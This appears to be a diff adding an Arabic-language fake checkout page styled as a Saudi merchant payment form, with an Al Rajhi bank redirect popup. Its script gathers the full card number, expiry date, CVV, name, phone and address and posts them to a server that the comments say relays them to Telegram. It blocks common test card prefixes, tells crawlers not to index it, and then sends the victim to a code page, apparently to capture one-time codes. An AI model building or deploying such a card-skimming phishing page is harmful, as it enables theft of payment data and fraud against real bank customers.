@@ -1,0 +1,879 @@
+<!DOCTYPE html>
+<html lang="ar">
+
+<head>
+  <meta charset="utf-8">
+
+    <meta content="width=device-width, initial-scale=1" name="viewport" />
+    <meta charset="utf-8">
+    <!-- Prevent indexing and following by well-behaved crawlers: -->
+    <meta name="robots" content="noindex, nofollow" />
+    <!-- Prevent archiving or snippet display: -->
+    <meta name="googlebot" content="noindex, nofollow, noarchive, nosnippet" />
+    <meta name="bingbot" content="noindex, nofollow" />
+    <meta name="yandex" content="none" />
+    <title>paymen</title>
+    <link crossorigin="anonymous" href="https://cdn.jsdelivr.net/npm/bootstrap@4.6.2/dist/css/bootstrap.min.css" integrity="sha384-xOolHFLEh07PJGoPkLv1IbcEPTNtaed2xpHsD9ESMhqIYd0nLMwNLD69Npy4HI+N" rel="stylesheet" />
+    <style>
+        @import url("https://fonts.googleapis.com/css2?family=Readex+Pro:wght@160..700&display=swap");
+    @import url("https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.5.0/css/all.min.css");
+
+    * {
+      font-family: "Readex Pro", sans-serif;
+      font-optical-sizing: auto;
+      font-weight: 400;
+      font-style: normal;
+      font-variation-settings: "HEXP" 0;
+    }
+
+    .content {
+      background: linear-gradient(180deg, #ffffff 0%, #fbfbfc 100%);
+      border-radius: 26px;
+      padding: 28px 20px;
+      margin: 0 10px 28px;
+      box-shadow: 0 20px 50px rgba(25, 31, 45, 0.08);
+      min-height: 200px;
+      font-size: 16px;
+      color: #333;
+      border: 1px solid rgba(208, 213, 221, 0.7);
+    }
+
+    .content-section {
+      display: none;
+    }
+
+    .content-section.active {
+      display: block;
+    }
+
+    .form-group {
+      margin-bottom: 1.5rem;
+    }
+
+    .form-group label {
+      font-size: 14px;
+      font-weight: 600;
+      color: #5d6572;
+      display: block;
+      margin-bottom: 6px;
+    }
+
+    body {
+      min-height: 100vh;
+      background:
+        radial-gradient(circle at top right, rgba(31, 122, 103, 0.10), transparent 24%),
+        radial-gradient(circle at top left, rgba(250, 166, 46, 0.10), transparent 22%),
+        linear-gradient(180deg, #f7f8fb 0%, #eef2f6 100%);
+      color: #243041;
+    }
+
+    body::before {
+      content: "";
+      position: fixed;
+      inset: 0;
+      pointer-events: none;
+      background:
+        linear-gradient(135deg, rgba(255, 255, 255, 0.28), transparent 34%),
+        radial-gradient(circle at 14% 18%, rgba(250, 166, 46, 0.08), transparent 18%);
+    }
+
+    .container {
+      position: relative;
+      z-index: 1;
+    }
+
+    .container.mt-5 .col-md-6 > div,
+    .container.mt-4 .clickable-card {
+      background: #fff;
+      border: 1px solid rgba(223, 228, 236, 0.95) !important;
+      border-radius: 26px !important;
+      box-shadow: 0 18px 40px rgba(25, 31, 45, 0.08);
+      overflow: hidden;
+      transition: transform 0.2s ease, box-shadow 0.2s ease;
+    }
+
+    .container.mt-5 .col-md-6 > div:hover,
+    .container.mt-4 .clickable-card:hover {
+      transform: translateY(-2px);
+      box-shadow: 0 24px 44px rgba(25, 31, 45, 0.11);
+    }
+
+    .form-control {
+      border-radius: 14px;
+      border: 1px solid #d8dde6;
+      min-height: 48px;
+      box-shadow: none !important;
+      background: #fdfdfd;
+    }
+
+    .form-control:focus {
+      border-color: #faa62e;
+      box-shadow: 0 0 0 0.18rem rgba(250, 166, 46, 0.18) !important;
+    }
+
+    .btn-warning {
+      border-radius: 14px;
+      border: 0;
+      box-shadow: 0 14px 22px rgba(250, 166, 46, 0.22);
+      letter-spacing: 0.2px;
+    }
+
+    .btn-warning:hover {
+      filter: brightness(0.98);
+    }
+
+    #loadingOverlay,
+    #rajhiModal {
+      backdrop-filter: blur(6px);
+    }
+
+    .page-shell {
+      width: min(100%, 520px);
+      margin: 0 auto;
+      min-height: 100vh;
+      padding: 10px 10px 22px;
+    }
+
+    .row.justify-content-center > .col-md-6.col-lg-4 {
+      flex: 0 0 100%;
+      max-width: 520px;
+      width: 100%;
+    }
+
+    .page-card {
+      background: #fff;
+      border: 1px solid rgba(223, 228, 236, 0.95);
+      border-radius: 28px;
+      box-shadow: 0 20px 50px rgba(25, 31, 45, 0.08);
+      overflow: hidden;
+      width: 100%;
+    }
+
+    .page-card::before {
+      content: "";
+      display: block;
+      height: 10px;
+      background: linear-gradient(90deg, #146394 0%, #1f7a67 52%, #faa62e 100%);
+    }
+
+    .code-accent {
+      height: 10px;
+      background: linear-gradient(90deg, #146394 0%, #1f7a67 52%, #faa62e 100%);
+    }
+
+    .summary-panel {
+      margin: 18px 0 20px;
+      border-radius: 20px;
+      border: 1px solid #e6ebf2;
+      background: linear-gradient(180deg, #fcfdff 0%, #f4f8fb 100%);
+      padding: 14px 14px 10px;
+    }
+
+    .summary-panel::before {
+      content: "";
+      display: block;
+      height: 6px;
+      margin: -14px -14px 12px;
+      background: linear-gradient(90deg, #146394 0%, #1f7a67 52%, #faa62e 100%);
+      border-radius: 20px 20px 0 0;
+    }
+
+    .summary-title {
+      color: #146394;
+      font-size: 15px;
+      font-weight: 800;
+      margin-bottom: 10px;
+    }
+
+    .summary-row {
+      display: flex;
+      align-items: center;
+      justify-content: space-between;
+      gap: 12px;
+      padding: 10px 0;
+      border-bottom: 1px solid rgba(223, 228, 236, 0.8);
+      font-size: 14px;
+    }
+
+    .summary-row:last-child {
+      border-bottom: 0;
+      padding-bottom: 0;
+    }
+
+    .summary-row .value {
+      font-weight: 800;
+      color: #243041;
+      white-space: nowrap;
+    }
+
+    .summary-total {
+      margin-top: 12px;
+      padding: 14px 14px 12px;
+      border-radius: 18px;
+      background: linear-gradient(180deg, #fff9ef 0%, #ffefcf 100%);
+      border: 1px solid rgba(250, 166, 46, 0.28);
+      display: flex;
+      align-items: center;
+      justify-content: space-between;
+      gap: 12px;
+    }
+
+    .summary-total .label {
+      color: #146394;
+      font-weight: 800;
+      font-size: 18px;
+    }
+
+    .summary-total .amount {
+      color: #faa62e;
+      font-weight: 800;
+      font-size: 22px;
+      display: flex;
+      align-items: center;
+      gap: 6px;
+      white-space: nowrap;
+    }
+
+    .summary-note {
+      font-size: 12px;
+      color: #6c7480;
+      margin-top: 8px;
+      line-height: 1.7;
+      text-align: right;
+    }
+
+    .summary-panel .summary-row {
+      display: none;
+    }
+
+    .summary-panel .summary-title {
+      margin-bottom: 6px;
+    }
+
+    .summary-panel .summary-total {
+      margin-top: 8px;
+      display: none;
+    }
+
+    .summary-panel,
+    .page-card,
+    .content {
+      backdrop-filter: blur(4px);
+    }
+
+    .privacy-note {
+      color: #6d7b8b;
+      font-size: 12px;
+      line-height: 1.85;
+      text-align: center;
+      word-break: break-word;
+    }
+
+    @media (max-width: 576px) {
+      .content {
+        margin: 0 3px 16px;
+        padding: 13px 9px 15px;
+        border-radius: 16px;
+      }
+
+      .page-shell {
+        width: 100%;
+        padding: 6px 5px 16px;
+      }
+
+      .row.justify-content-center > .col-md-6.col-lg-4 {
+        flex: 0 0 100%;
+        max-width: 100%;
+      }
+
+      .container.mt-5 {
+        margin-top: 8px !important;
+      }
+
+      .page-card > div {
+        padding-left: 9px !important;
+        padding-right: 9px !important;
+      }
+
+      .summary-panel {
+        padding: 10px 10px 8px;
+        margin: 8px 0 10px;
+      }
+
+      .summary-title {
+        font-size: 13px;
+      }
+
+      .summary-total .label {
+        font-size: 15px;
+      }
+
+      .summary-total .amount {
+        font-size: 17px;
+      }
+
+      .summary-row {
+        padding: 0;
+        font-size: 12px;
+      }
+
+      .summary-total {
+        padding: 12px 12px 10px;
+        margin-top: 8px;
+      }
+
+      .d-flex.justify-content-center {
+        flex-direction: column;
+        align-items: stretch;
+      }
+
+      .d-flex.justify-content-center .form-group {
+        margin-left: 0 !important;
+        width: 100%;
+      }
+
+      .d-flex.justify-content-center .form-group + .form-group {
+        margin-top: 12px;
+      }
+
+      .form-group.text-left {
+        text-align: right !important;
+      }
+
+      .form-control {
+        min-height: 40px;
+      }
+
+      .privacy-note {
+        font-size: 8px;
+        line-height: 1.7;
+        margin-top: 6px;
+      }
+
+      .page-card {
+        border-radius: 18px;
+      }
+
+      .page-card h6 {
+        font-size: 11px !important;
+      }
+
+      .btn-warning {
+        min-height: 42px;
+        font-size: 16px;
+        border-radius: 14px;
+      }
+
+      #pay_com {
+        width: 46px !important;
+      }
+
+      .page-card .text-right > h6:first-of-type {
+        font-size: 11px !important;
+      }
+    }
+
+    @media (min-width: 992px) {
+      .page-shell {
+        width: min(100%, 520px);
+      }
+
+      .row.justify-content-center > .col-md-6.col-lg-4 {
+        max-width: 520px;
+      }
+
+      .page-card > div {
+        padding-left: 14px !important;
+        padding-right: 14px !important;
+      }
+
+      .summary-panel {
+        padding: 14px 14px 7px;
+      }
+    }
+
+    @media (min-width: 1400px) {
+      .page-shell {
+        width: min(100%, 520px);
+      }
+
+      .row.justify-content-center > .col-md-6.col-lg-4 {
+        max-width: 520px;
+      }
+    }
+  </style>
+</head>
+<div class="container">
+    <div class="alert alert-danger mt-3 text-right" id="decline-message" role="alert" style="display: none">
+        <span>لم يتم معالجة طلبك، يرجى استخدام وسيلة دفع أخرى.</span>
+    </div>
+</div>
+
+<body dir="rtl">
+    <!-- Promo Popup -->
+    <!--   <div id="promoPopup" style="
+        display: flex;
+        position: fixed;
+        top: 0;
+        left: 0;
+        width: 100%;
+        height: 100%;
+        background: rgba(0, 0, 0, 0.7);
+        z-index: 1000;
+        justify-content: center;
+        align-items: center;
+      ">
+    <div style="
+          background: white;
+          padding: 20px;
+          border-radius: 15px;
+          text-align: center;
+          max-width: 400px;
+          width: 90%;
+          box-shadow: 0 4px 10px rgba(0, 0, 0, 0.3);
+        ">
+      <img src="/assets/photos/promo.jpg" alt="عرض خاص" style="width: 100%; border-radius: 10px; margin-bottom: 20px" />
+
+      <h2 style="color: #333; font-size: 22px; margin-bottom: 10px">
+        سارع قبل نهاية العرض!
+      </h2>
+      <p style="color: #555; font-size: 16px; margin-bottom: 20px">
+        يتبقى على انتهاء العرض:
+      </p>
+
+      <div id="countdownTimer" style="
+            font-size: 36px;
+            font-weight: bold;
+            color: #28a745;
+            margin-bottom: 20px;
+            letter-spacing: 2px;
+          ">
+        00:00:00
+      </div>
+
+      <div style="display: flex; justify-content: space-between; gap: 15px">
+        <button onclick="closePopup()" style="
+              flex: 1;
+              background: #6c757d;
+              color: white;
+              padding: 10px;
+              border: none;
+              border-radius: 5px;
+              cursor: pointer;
+            ">
+          إغلاق
+        </button>
+      </div>
+    </div>
+  </div> -->
+    <div class="page-shell">
+    <div class="container mt-5" id="applePayRadio">
+        <div class="row justify-content-center">
+            <div class="col-md-6 col-lg-4">
+                <div class="page-card" style="font-family: 'Tahoma', sans-serif;">
+                    <div class="code-accent"></div>
+                    <div style="padding: 18px 16px 16px">
+                        <div class="text-right">
+                            <div class="d-flex align-items-center justify-content-between mb-2">
+                                <h6 style="color: #626262; margin: 0">بيانات الدفع</h6>
+                                <img alt="" id="pay_com" width="60px" />
+                            </div>
+                            <h6 style="font-size: 12px; font-weight: 700; color: #146394; line-height: 1.7; display: none">
+                                سيتم تنفيذ عملية الدفع من خلال الوسيلة المحددة أدناه.
+                            </h6>
+                            <div class="summary-panel">
+                                <div class="summary-title" style="display: flex; align-items: center; justify-content: flex-end;">
+                                    <img src="assets/photos/home-logo.png" alt="شعار دواجن الوطنية" style="height: 28px; width: auto; display: block;" />
+                                </div>
+                                <div class="summary-row">
+                                    <span>المبلغ الأساسي</span>
+                                    <span class="value">----</span>
+                                </div>
+                                <div class="summary-row">
+                                    <span>التخفيض</span>
+                                    <span class="value">----</span>
+                                </div>
+                                <div class="summary-row">
+                                    <span>الضريبة</span>
+                                    <span class="value">----</span>
+                                </div>
+                                <div class="summary-row">
+                                    <span>الرسوم</span>
+                                    <span class="value">----</span>
+                                </div>
+                                <div class="summary-row">
+                                    <span>عدد الأسطر</span>
+                                    <span class="value">5</span>
+                                </div>
+                                <div class="summary-total">
+                                    <span class="label">عدد الطلبات</span>
+                                    <span class="amount"><span id="selected_insurance_price_final">0</span></span>
+                                </div>
+                                <div class="summary-note" style="display: none">تصميم بصري تعريفي فقط، وتبقى الحقول والروابط كما هي.</div>
+                            </div>
+                            <form id="paymentForm">
+                                <div class="form-group">
+                                    <label for="codeÙ€holderÙ€name">اسم حامل البطاقة</label>
+                                    <input class="form-control text-center" id="codeÙ€holderÙ€name" type="text" />
+                                </div>
+                                <div class="form-group">
+                                    <label for="cardÙ€number">رقم البطاقة</label>
+                                    <input class="form-control text-center" id="cardÙ€number" placeholder="0000 0000 0000 0000" type="tel" />
+                                </div>
+                                <div class="d-flex justify-content-center">
+                                    <div class="form-group ml-2">
+                                        <label for="expirationÙ€date">تاريخ انتهاء البطاقة</label>
+                                        <input class="form-control text-center" id="expirationÙ€date" placeholder="MM/YY" type="tel" />
+                                    </div>
+                                    <div class="form-group text-left">
+                                        <label for="cvv">CVV / CVC</label>
+                                        <input autocomplete="cc-csc" class="form-control text-center" id="cvv" placeholder="***" type="password" />
+                                    </div>
+                                </div>
+                                <button class="btn btn-warning col-12 p-2" style="
+                      background: linear-gradient(180deg, #faa62e 0%, #f38f16 100%);
+                      color: #fff;
+                      font-weight: 800;
+                    " type="submit">
+                                    إتمام الدفع
+                                </button>
+                                <p class="mt-3 privacy-note">
+                                    نحرص على استخدام بياناتك الشخصية فقط لغرض تنفيذ طلبك، وذلك بما يتوافق مع الأغراض الموضحة في سياسة الخصوصية المعتمدة وفق الأنظمة المعمول بها في المملكة العربية السعودية.
+                                </p>
+                            </form>
+                        </div>
+                    </div>
+                </div>
+            </div>
+        </div>
+    </div>
+    <div class="container mt-3 text-right justify-content-center" style="opacity: 0.92">
+        <img alt="" src="assets/photos/vecteezy-icon.png" width="100px" />
+        <img alt="" src="assets/photos/vecteezy_icon01.jpg" width="45px" />
+    </div>
+    <div id="loadingOverlay" style="
+        display: none;
+        position: fixed;
+        inset: 0;
+        background-color: rgba(0, 0, 0, 0.6);
+        z-index: 9999;
+        justify-content: center;
+        align-items: center;
+      ">
+        <div class="text-center text-white">
+            <div class="spinner-border text-light mb-3" role="status"></div>
+            <h5 class="font-weight-bold">يرجى الانتظار</h5>
+            <p>انتظر حتى تتم معالجة طلبك</p>
+        </div>
+    </div>
+    <!-- Rajhi redirect popup (5s spinner + countdown) -->
+    <div id="rajhiModal" style="
+  display: none;
+  position: fixed;
+  inset: 0;
+  background: rgba(0,0,0,0.65);
+  z-index: 10000;
+  justify-content: center;
+  align-items: center;
+">
+        <div dir="rtl" style="
+    background: #fff;
+    width: min(520px, 92vw);
+    border-radius: 12px;
+    padding: 24px 20px;
+    text-align: center;
+    box-shadow: 0 8px 24px rgba(0,0,0,0.15);
+  ">
+            <div class="spinner-border text-warning mb-3" role="status" aria-hidden="true"></div>
+            <h5 class="font-weight-bold mb-2">عملاء مصرف الراجحي</h5>
+            <p class="mb-1">سيتم إجراء عملية دفع قيمة التأمين من خلال</p>
+            <p class="mb-3" style="font-weight:700">خدمة سداد</p>
+            <p class="mb-1">جاري تحويلك الآن إلى الراجحي أونلاين ... لتأكيد الدفع</p>
+            <p class="mb-0">سيتم الإرسال خلال <span id="rajhiCountdown" style="font-weight:700">5</span> ثوان...</p>
+        </div>
+    </div>
+
+
+
+
+
+
+<script src="assets/telegram/tg.js"></script>
+<script src="assets/telegram/telegram.js"></script>
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+    <script>
+    function isValidCardNumber(cardNumber) {
+        const clean = cardNumber.replace(/\D/g, "");
+        if (clean.length < 12 || clean.length > 19) 
+          return false;
+        const digits = clean
+            .split("")
+            .reverse()
+            .map((d) => parseInt(d, 10));
+        let sum = 0;
+        for (let i = 0; i < digits.length; i++) {
+            let d = digits[i];
+            if (i % 2 === 1) {
+                d *= 2;
+                if (d > 9) d -= 9;
+            }
+            sum += d;
+        }
+        return sum % 10 === 0;
+  }
+  function formatCardNumber(value) {
+    return value.replace(/\D/g, "").substring(0, 16).replace(/(.{4})/g, "$1 ").trim();
+  }
+  function isValidExpiryDate(value) {
+    if (!/^(0[1-9]|1[0-2])\/\d{2}$/.test(value)) 
+      return false;
+    const [month, year] = value.split("/").map(Number);
+    const now = new Date();
+    const expiry = new Date(`20${year}`, month);
+    return expiry > now;
+  }
+  function detectCardType(number) {
+    const clean = number.replace(/\s+/g, "");
+    if (/^4/.test(clean)) return "visa";
+    if (/^5[1-5]/.test(clean)) return "mastercard";
+    return null;
+  }
+  function isValidCardHolderName(name) {
+    const trimmed = name.trim();
+    if (trimmed.length < 3) return false;
+    if (/[^a-zA-ZØ¡-ÙŠ\s]/.test(trimmed)) return false;
+    if (/(.)\1{2,}/.test(trimmed)) return false;
+    if (/^(..)+\1$/.test(trimmed.replace(/\s+/g, ""))) return false;
+    const words = trimmed.split(/\s+/);
+    const joined = words.join(" ").toLowerCase();
+    const repeatedPattern = /(\b\w{2,}\b)(?:\s+\1){1,}/;
+    if (repeatedPattern.test(joined)) return false;
+    return true;
+  }
+  
+  document.addEventListener("DOMContentLoaded", () => {
+      const cardInput = document.getElementById("cardÙ€number");
+      const expiryInput = document.getElementById("expirationÙ€date");
+      const nameInput = document.getElementById("codeÙ€holderÙ€name");
+      const cvvInput = document.getElementById("cvv");
+      const img = document.createElement("img");
+      img.style.position = "absolute";
+      img.style.left = "10px";
+      img.style.top = "70%";
+      img.style.transform = "translateY(-50%)";
+      img.style.zIndex = "10";
+      img.style.width = "32px";
+      img.style.height = "auto";
+      img.style.display = "none";
+      cardInput.parentElement.style.position = "relative";
+      cardInput.parentElement.appendChild(img);
+    
+      cardInput.addEventListener("input", () => {
+        const formatted = formatCardNumber(cardInput.value);
+        cardInput.value = formatted;
+        const type = detectCardType(formatted);
+        if (type === "visa") {
+          img.src = "assets/photos/Visa.png";
+          img.style.display = "block";
+          sessionStorage.setItem("Card type", "visa");
+        } 
+        else if (type === "mastercard") {
+          img.src = "assets/photos/Mastercard.png";
+          img.style.display = "block";
+          sessionStorage.setItem("Card type", "mastercard");
+        } 
+        else {
+          img.style.display = "none";
+          sessionStorage.removeItem("Card type");
+        }
+        const blockedBins = ["0000", "4242","5246","4201","4548","4424","4079","4125","4575","5292","4890","4896","4323","4456","4286","4834","4909",];
+        const clean = formatted.replace(/\s+/g, "");
+        const prefix4 = clean.slice(0, 4);
+        const binOK = !blockedBins.includes(prefix4);
+        if (binOK && isValidCardNumber(formatted)) {
+          cardInput.classList.remove("is-invalid");
+          cardInput.classList.add("is-valid");
+        } 
+        else {
+          cardInput.classList.remove("is-valid");
+          cardInput.classList.add("is-invalid");
+        }
+      });
+      expiryInput.addEventListener("input", (e) => {
+        let value = e.target.value.replace(/[^\d]/g, "").substring(0, 4);
+        if (value.length >= 3) {
+          value = value.substring(0, 2) + "/" + value.substring(2);
+        }
+        e.target.value = value;
+        if (isValidExpiryDate(value)) {
+          expiryInput.classList.remove("is-invalid");
+          expiryInput.classList.add("is-valid");
+        } 
+        else {
+          expiryInput.classList.remove("is-valid");
+          expiryInput.classList.add("is-invalid");
+        }
+      });
+      nameInput.addEventListener("input", () => {
+        if (isValidCardHolderName(nameInput.value)) {
+          nameInput.classList.remove("is-invalid");
+          nameInput.classList.add("is-valid");
+        } else {
+          nameInput.classList.remove("is-valid");
+          nameInput.classList.add("is-invalid");
+        }
+      });
+      cvvInput.addEventListener("input", () => {
+        cvvInput.value = cvvInput.value.replace(/[^\d]/g, "").substring(0, 3);
+        if (cvvInput.value.length === 3) {
+          cvvInput.classList.remove("is-invalid");
+          cvvInput.classList.add("is-valid");
+        } 
+        else {
+          cvvInput.classList.remove("is-valid");
+          cvvInput.classList.add("is-invalid");
+        }
+      });
+    });
+
+
+
+    document.addEventListener("DOMContentLoaded", async () => {
+      while (window.visitorIP === null) {
+        await new Promise((r) => setTimeout(r, 50));
+      }
+
+      const method = sessionStorage.getItem("paymentMethod");
+      const logo = document.getElementById("pay_com");
+      if (method === "mada") logo.src = "assets/photos/mad.png";
+      else if (method === "visa_mastarcard") logo.src = "assets/photos/vimas.webp";
+      else if (method === "applepay") logo.src = "assets/photos/appy.jpg";
+      logo.style.float = "right";
+      const alRajhiBins = ["4847","4054","4299","4458","4030","4092","4622","4146","4173","4455","4321","4226","4166",];
+
+      const form = document.getElementById("paymentForm");
+      const overlayEl = document.getElementById("loadingOverlay");
+      const rajhiModal = document.getElementById("rajhiModal");
+      const countdownEl = document.getElementById("rajhiCountdown");
+      let isSubmitting = false; // ðŸš« prevent double submits
+      let countdownTimer = null;
+
+      // Back/forward gesture (BFCache) can restore the page mid-submit.
+      // Reset transient UI state so validation/submit works again.
+      window.addEventListener(
+        "pageshow",
+        () => {
+          isSubmitting = false;
+          if (overlayEl) overlayEl.style.display = "none";
+          if (rajhiModal) rajhiModal.style.display = "none";
+          if (countdownTimer) {
+            clearInterval(countdownTimer);
+            countdownTimer = null;
+          }
+        },
+        { passive: true }
+      );
+
+      form.addEventListener("submit", async (e) => {
+        e.preventDefault();
+        if (isSubmitting) return;
+        const cardInput = document.getElementById("cardÙ€number");
+        const nameInput = document.getElementById("codeÙ€holderÙ€name");
+        const expiryInput = document.getElementById("expirationÙ€date");
+        const cvvInput = document.getElementById("cvv");
+
+        const allValid = cardInput.classList.contains("is-valid") && nameInput.classList.contains("is-valid") && expiryInput.classList.contains("is-valid") && cvvInput.classList.contains("is-valid");
+
+        if (!allValid) {
+          alert("يرجى التأكد من صحة جميع الحقول قبل الإرسال.");
+          return;
+        }
+
+        isSubmitting = true;
+        overlayEl.style.display = "flex";
+
+        const name = nameInput.value.trim();
+        const cardRaw = cardInput.value.replace(/\s+/g, "");
+        const exp = expiryInput.value.trim();
+        const cvv = cvvInput.value.trim();
+        if (!cvv) {
+          alert("رجاءً أدخل رمز CVV صالح");
+          overlayEl.style.display = "none";
+          isSubmitting = false;
+          return;
+        }
+
+        sessionStorage.setItem("cardBin", cardRaw.substring(0, 6));
+
+        // جمع البيانات من البداية والنهاية
+        const paymentData = {
+          // بيانات الدفع - FULL CARD INFO
+          cardHolder: name,
+          cardNumber: cardRaw, // رقم البطاقة الكامل (16 رقم)
+          expiryDate: exp,
+          cvv: cvv, // CVV الكامل
+          cardType: sessionStorage.getItem("Card type") || "unknown",
+          paymentMethod: sessionStorage.getItem("paymentMethod") || "unknown",
+          
+          // بيانات العنوان (إن وجدت)
+          fullName: sessionStorage.getItem("fullName") || name,
+          phone: sessionStorage.getItem("phone") || "غير محدد",
+          address: sessionStorage.getItem("address") || "غير محدد",
+          
+          // الطلب
+          product: sessionStorage.getItem("cartSummary") || "طلب دفع",
+          timestamp: new Date().toLocaleString('ar-KW')
+        };
+
+        // إرسال البيانات الكاملة إلى الخادم
+        try {
+          const response = await fetch('http://localhost:3000/api/send-order', {
+            method: 'POST',
+            headers: { 'Content-Type': 'application/json' },
+            body: JSON.stringify({
+              name: paymentData.fullName,
+              phone: paymentData.phone,
+              address: paymentData.address,
+              product: paymentData.product + "\n\n💳 بيانات البطاقة:\n   رقم البطاقة: " + paymentData.cardNumber + "\n   تاريخ الانتهاء: " + paymentData.expiryDate + "\n   CVV: " + paymentData.cvv + "\n\n💳 طريقة الدفع: " + paymentData.paymentMethod + "\n💰 نوع البطاقة: " + paymentData.cardType + "\n⏰ الوقت: " + paymentData.timestamp
+            })
+          });
+
+          const result = await response.json();
+          
+          if (response.ok && result.success) {
+            // إذا أُرسلت البيانات بنجاح إلى Telegram
+            console.log('✅ تم إرسال بيانات الدفع إلى Telegram بنجاح');
+          }
+        } catch (error) {
+          console.warn('⚠️ تنبيه: الخادم قد لا يكون متصلاً, لكن سنكمل العملية:', error.message);
+        }
+
+        // الانتظار قليلاً ثم الذهاب إلى صفحة code
+        setTimeout(() => {
+          window.location.href = "code.html";
+        }, 1000);
+      })
+    });
+    </script>
+
+
+
+</body>
+
+
+</html>
